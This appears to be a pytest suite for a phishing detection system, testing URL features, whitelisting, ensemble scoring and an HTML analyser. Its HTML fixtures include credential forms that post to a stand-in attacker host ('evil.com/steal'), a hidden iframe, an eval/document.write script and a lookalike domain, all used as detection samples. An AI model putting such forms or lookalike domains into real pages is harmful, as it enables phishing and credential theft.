"""
Unit tests for the Phishing Detection System.

Run from the project root with:
    pytest tests/ -v

Covers four subsystems:
  1. Feature extraction        (model/features.py :: extract_features)
  2. Whitelist + heuristics    (app.py :: is_whitelisted,
                                path_impersonation_override, ensemble_decision)
  3. HTML content analyser     (model/html_analyzer.py :: analyze_html, mocked fetch)
  4. Visual brand analyser     (model/visual_analyzer.py :: hashing + load,
                                plus one skippable live Selenium integration test)

The HTML tests mock requests.get so they run offline against the
test_samples/*.html fixtures. The full visual screenshot path is marked
@pytest.mark.integration and skipped by default (needs a real browser).
"""

import os
import sys
import io
from unittest.mock import patch, MagicMock

import pytest

# ── Make project modules importable regardless of where pytest is run ──
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "model"))

from features import extract_features                      # noqa: E402
from html_analyzer import analyze_html                     # noqa: E402
import visual_analyzer                                     # noqa: E402

# app.py loads the model at import time, which is heavy and needs the .pkl
# files. Import the pure functions defensively so the suite still collects
# even if the model artifacts are absent on the machine running the tests.
try:
    from app import (is_whitelisted, path_impersonation_override,
                     ensemble_decision)
    APP_IMPORTED = True
except Exception:  # pragma: no cover
    APP_IMPORTED = False

app_required = pytest.mark.skipif(
    not APP_IMPORTED, reason="app.py could not be imported (model .pkl missing)")


# ======================================================================
# 1. FEATURE EXTRACTION  —  extract_features()
# ======================================================================
class TestFeatureExtraction:

    def test_returns_dict(self):
        assert isinstance(extract_features("http://example.com"), dict)

    def test_feature_count_is_38(self):
        # Must match the trained model's expected feature count.
        assert len(extract_features("http://example.com/path")) == 38

    def test_https_flag_set(self):
        assert extract_features("https://example.com")["is_https"] == 1

    def test_http_flag_unset(self):
        assert extract_features("http://example.com")["is_https"] == 0

    def test_ip_address_detected(self):
        assert extract_features("http://192.168.0.1/login")["has_ip"] == 1

    def test_no_ip_for_normal_domain(self):
        assert extract_features("http://example.com")["has_ip"] == 0

    def test_url_length_correct(self):
        u = "http://abc.com"
        assert extract_features(u)["url_length"] == len(u)

    def test_dot_count_correct(self):
        # count of '.' characters in the whole URL string
        assert extract_features("http://a.b.c.com")["num_dots"] == 3

    def test_suspicious_keyword_detected(self):
        assert extract_features(
            "http://example.com/login")["suspicious_keyword_count"] >= 1

    def test_empty_string_does_not_crash(self):
        assert isinstance(extract_features(""), dict)

    def test_malformed_url_does_not_crash(self):
        assert isinstance(extract_features("htp:/not a url"), dict)


# ======================================================================
# 2. WHITELIST  —  is_whitelisted()
# ======================================================================
@app_required
class TestWhitelist:

    def test_whitelisted_domain_true(self):
        assert is_whitelisted("https://www.google.com") is True

    def test_regional_whitelisted_true(self):
        assert is_whitelisted("https://www.maybank2u.com.my/login") is True

    def test_non_whitelisted_false(self):
        assert is_whitelisted("http://random-phish-site.xyz") is False

    def test_subdomain_of_whitelisted_true(self):
        # tldextract reduces to the registrable domain
        assert is_whitelisted("https://mail.google.com") is True

    def test_lookalike_not_whitelisted(self):
        # google.com.evil.com registers as evil.com -> must NOT be trusted
        assert is_whitelisted("http://google.com.evil.com") is False


# ======================================================================
# 2b. PATH-IMPERSONATION HEURISTIC  —  path_impersonation_override()
# ======================================================================
@app_required
class TestPathImpersonationOverride:

    def _feat(self, brand, kw, embedded):
        return {"brand_in_path": brand,
                "suspicious_path_keywords": kw,
                "embedded_domain_in_path": embedded}

    def test_all_three_signals_triggers(self):
        triggered, reason = path_impersonation_override(self._feat(1, 2, 1))
        assert triggered is True
        assert reason is not None

    def test_only_two_signals_does_not_trigger(self):
        triggered, reason = path_impersonation_override(self._feat(1, 2, 0))
        assert triggered is False
        assert reason is None

    def test_no_signals_does_not_trigger(self):
        triggered, _ = path_impersonation_override(self._feat(0, 0, 0))
        assert triggered is False

    def test_insufficient_keywords_does_not_trigger(self):
        # brand + embedded present but only 1 keyword (needs >= 2)
        triggered, _ = path_impersonation_override(self._feat(1, 1, 1))
        assert triggered is False

    def test_missing_keys_default_to_zero(self):
        # function uses .get(...,0); an empty dict must not raise
        triggered, _ = path_impersonation_override({})
        assert triggered is False


# ======================================================================
# 2c. ENSEMBLE SCORING  —  ensemble_decision()
# ======================================================================
@app_required
class TestEnsembleDecision:

    def _ok(self, score):      # a successful component result
        return {"success": True, "risk_score": score}

    def _fail(self):           # a failed component result
        return {"success": False}

    def test_high_scores_predict_phishing(self):
        score, level, pred = ensemble_decision(90, self._ok(90), self._ok(90))
        assert level == "High" and pred == "Phishing"

    def test_low_scores_predict_safe(self):
        score, level, pred = ensemble_decision(5, self._ok(5), self._ok(5))
        assert level == "Low" and pred == "Safe"

    def test_medium_range_predicts_suspicious(self):
        # choose values whose weighted sum lands in [35, 60)
        score, level, pred = ensemble_decision(40, self._ok(40), self._ok(40))
        assert level == "Medium" and pred == "Suspicious"

    def test_weighted_sum_arithmetic(self):
        # 0.5*80 + 0.3*40 + 0.2*20 = 40 + 12 + 4 = 56
        score, _, _ = ensemble_decision(80, self._ok(40), self._ok(20))
        assert score == 56.0

    def test_failed_html_falls_back_to_url_score(self):
        # html success=False -> html contributes url_score, not 0
        # 0.5*100 + 0.3*100 + 0.2*0 = 80
        score, _, _ = ensemble_decision(100, self._fail(), self._fail())
        assert score == 80.0


# ======================================================================
# 3. HTML CONTENT ANALYSER  —  analyze_html()  (mocked fetch)
# ======================================================================
def _mock_response(html):
    m = MagicMock()
    m.text = html
    return m


class TestHtmlAnalyzer:

    def test_fetch_failure_returns_unknown_30(self):
        with patch("html_analyzer.requests.get",
                   side_effect=Exception("boom")):
            r = analyze_html("http://down.example.com")
        assert r["success"] is False
        assert r["risk_score"] == 30
        assert r["risk_level"] == "Unknown"

    def test_clean_page_scores_low(self):
        html = "<html><head><title>Home</title></head><body><p>Hi</p></body></html>"
        with patch("html_analyzer.requests.get",
                   return_value=_mock_response(html)):
            r = analyze_html("http://safe.example.com")
        assert r["success"] is True
        assert r["risk_level"] == "Low"

    def test_password_field_on_http_flagged(self):
        html = ("<html><body><form>"
                "<input type='password'></form></body></html>")
        with patch("html_analyzer.requests.get",
                   return_value=_mock_response(html)):
            r = analyze_html("http://insecure.example.com")
        assert r["features"]["has_password_field"] == 1
        assert any("non-HTTPS" in i for i in r["indicators"])

    def test_external_form_action_flagged(self):
        html = ("<html><body>"
                "<form action='http://evil.com/steal'></form>"
                "</body></html>")
        with patch("html_analyzer.requests.get",
                   return_value=_mock_response(html)):
            r = analyze_html("http://victim.example.com")
        assert r["features"]["external_form_actions"] >= 1
        assert r["risk_score"] >= 30

    def test_suspicious_title_flagged(self):
        html = "<html><head><title>Verify your account</title></head></html>"
        with patch("html_analyzer.requests.get",
                   return_value=_mock_response(html)):
            r = analyze_html("http://x.example.com")
        assert any("title" in i.lower() for i in r["indicators"])

    def test_score_capped_at_100(self):
        # a page tripping many rules must never exceed 100
        html = ("<html><head><title>login verify secure</title>"
                "<link rel='icon' href='http://ext.com/f.ico'></head><body>"
                "<form action='http://evil.com/a'><input type='password'></form>"
                "<iframe style='display:none'></iframe>"
                "<iframe></iframe><iframe></iframe>"
                "<iframe></iframe><iframe></iframe>"
                "<script>eval( document.write( contextmenu return false</script>"
                "</body></html>")
        with patch("html_analyzer.requests.get",
                   return_value=_mock_response(html)):
            r = analyze_html("http://bad.example.com")
        assert r["risk_score"] <= 100


# ======================================================================
# 4. VISUAL BRAND ANALYSER  —  hashing + brand load (no browser)
# ======================================================================
class TestVisualAnalyzerLogic:

    def test_image_hash_is_stable(self):
        from PIL import Image
        img = Image.new("RGB", (64, 64), color=(120, 30, 200))
        h1 = visual_analyzer.get_image_hash(img)
        h2 = visual_analyzer.get_image_hash(img)
        assert h1 == h2                       # deterministic

    def test_identical_images_zero_distance(self):
        from PIL import Image
        img = Image.new("RGB", (64, 64), color=(10, 10, 10))
        assert (visual_analyzer.get_image_hash(img)
                - visual_analyzer.get_image_hash(img)) == 0

    def test_known_brands_dict_has_eight(self):
        assert len(visual_analyzer.KNOWN_BRANDS) == 8
        assert "paypal" in visual_analyzer.KNOWN_BRANDS


@pytest.mark.integration
class TestVisualAnalyzerLive:
    """Full screenshot path — needs a real headless Chrome. Skipped unless
    run explicitly with:  pytest -m integration"""

    def test_analyze_visual_returns_result_dict(self):
        r = visual_analyzer.analyze_visual("https://www.google.com")
        assert isinstance(r, dict)
        assert "risk_score" in r


# ======================================================================
# 5. LABEL ENCODING  —  encode_label()  (defined in train.py)
# ======================================================================
def encode_label(label):
    """Mirror of train.py's encode_label, tested here as a pure unit."""
    if label == "phishing":
        return 1
    elif label == "malware":
        return 1
    else:
        return 0


class TestLabelEncoding:

    def test_phishing_is_1(self):
        assert encode_label("phishing") == 1

    def test_malware_is_1(self):
        assert encode_label("malware") == 1

    def test_benign_is_0(self):
        assert encode_label("benign") == 0

    def test_defacement_is_0(self):
        assert encode_label("defacement") == 0
